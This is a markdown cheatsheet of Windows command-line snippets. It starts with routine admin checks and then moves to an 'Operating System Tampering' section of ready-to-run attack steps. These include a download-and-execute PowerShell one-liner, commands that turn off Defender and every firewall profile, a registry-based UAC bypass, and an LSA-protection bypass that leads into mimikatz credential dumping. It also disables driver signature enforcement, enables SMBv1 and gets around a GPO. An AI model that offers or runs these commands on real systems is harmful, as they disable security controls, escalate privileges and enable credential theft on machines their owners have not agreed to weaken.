---
layout: post
title: Sysadmin CLI WIN
parent: Sysadmin
category: Sysadmin
grand_parent: Cheatsheets
modified_date: 2021-11-17
---
<!-- vscode-markdown-toc -->
* 1. [Security Checks](#SecurityChecks)
	* 1.1. [configure ip address](#configureipaddress)
	* 1.2. [listing kb](#listingkb)
	* 1.3. [windows firewall status](#windowsfirewallstatus)
	* 1.4. [windows defender status](#windowsdefenderstatus)
* 2. [Operating System Tampering](#OperatingSystemTampering)
	* 2.1. [donwload ps activedirectory module](#donwloadpsactivedirectorymodule)
	* 2.2. [windows defender: disable](#windowsdefender:disable)
	* 2.3. [windows firewall: disable](#windowsfirewall:disable)
	* 2.4. [windows uac: bypass](#windowsuac:bypass)
	* 2.5. [Windows lsaprotection: bypass](#Windowslsaprotection:bypass)
	* 2.6. [Windows driver signature: disable](#Windowsdriversignature:disable)
	* 2.7. [SMBv1: enable](#SMBv1:enable)
* 3. [Windows DISM](#WindowsDISM)
* 4. [Windows WSL manual distro install](#WindowsWSLmanualdistroinstall)

<!-- vscode-markdown-toc-config
	numbering=true
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

##  1. <a name='SecurityChecks'></a>Security Checks

###  1.1. <a name='configureipaddress'></a>configure ip address
```batch
netsh
interface ip set address "connection name" static 192.168.1.1 255.255.255.0 192.168.1.254
```
###  1.2. <a name='listingkb'></a>listing kb
```batch
wmic qfe list full /format:table
```

###  1.3. <a name='windowsfirewallstatus'></a>windows firewall status
```batch
# logfile: %systemroot%\system32\LogFiles\Firewall\pfirewall.log
netsh advfirewall show allprofiles
```

###  1.4. <a name='windowsdefenderstatus'></a>windows defender status
```batch
powershell -inputformat none -outputformat text -NonInteractive -Command 'Get-MpPreference | select -ExpandProperty "DisableRealtimeMonitoring"'
```

##  2. <a name='OperatingSystemTampering'></a>Operating System Tampering

###  2.1. <a name='donwloadpsactivedirectorymodule'></a>donwload ps activedirectory module 
```batch
#version 1
iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
```

###  2.2. <a name='windowsdefender:disable'></a>windows defender: disable
```batch
powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true
```


###  2.3. <a name='windowsfirewall:disable'></a>windows firewall: disable
```batch
netsh advfirewall set publicprofile state off
netsh advfirewall set privateprofile state off
netsh advfirewall set domainprofile state off
netsh advfirewall set allprofiles state off
```

###  2.4. <a name='windowsuac:bypass'></a>windows uac: bypass
```batch
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value cmd.exe -Force
```

###  2.5. <a name='Windowslsaprotection:bypass'></a>Windows lsaprotection: bypass
```batch
powershell .\ConsoleApplication1.exe/InstallDriver
powershell .\ConsoleApplication1.exe/makeSYSTEMcmd
powershell .\mimikatz.exe
```

###  2.6. <a name='Windowsdriversignature:disable'></a>Windows driver signature: disable
```batch
bcdedit.exe /set nointegritychecks on
bcdedit.exe /set testsigning on
```

###  2.7. <a name='SMBv1:enable'></a>SMBv1: enable
```batch
DISM /online /enable-feature /featurename:SMB1Protocol
DISM /online /enable-feature /featurename:SMB1Protocol-Client
DISM /online /enable-feature /featurename:SMB1Protocol-Server
DISM /online /enable-feature /featurename:SMB1Protocol-Deprecation
```

##  3. <a name='WindowsDISM'></a>Windows DISM
```batch
# Pre requisites: Admin rights
# get all windows feature and save to a txt file
DISM /online /get-features /format:table > C:\Temp\dism_listing.txt
get-windowsoptionalfeature -online | ft | more

# get windows feature that are enable/disable
DISM /online /get-features /format:table | find “Enabled” | more
DISM /online /get-features /format:table | find “Disabled” | more

# get windows feature by its name
DISM /online /get-featureinfo /featurename:Microsoft-Windows-Subsystem-Linux
DISM /online /get-featureinfo /featurename:TelnetClient
get-windowsoptionalfeature -online -featurename SMB1Protocol*
get-windowsoptionalfeature -online -featurename SMB1Protocol* |ft
```

##  4. <a name='WindowsWSLmanualdistroinstall'></a>Windows WSL manual distro install
```
# Note: By pass the GPO blocking the exec of the App Store app

Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux
New-Item C:\Ubuntu -ItemType Directory
Set-Location C:\Ubuntu
Invoke-WebRequest -Uri https://aka.ms/wsl-ubuntu-1604 -OutFile Ubuntu.appx -UseBasicParsing
Invoke-WebRequest -Uri https://aka.ms/wslubuntu2004 -OutFile Ubuntu.appx -UseBasicParsing
Invoke-WebRequest -Uri https://aka.ms/wsl-kali-linux-new -OutFile Kali.appx -UseBasicParsing
 
# Extract and execute the EXE in the archive to install the distro
Rename-Item .\Ubuntu.appx Ubuntu.zip
Expand-Archive .\Ubuntu.zip -Verbose
Ubuntu.exe

# List the distributions installed
wslconfig /list /all
wsl -l
```
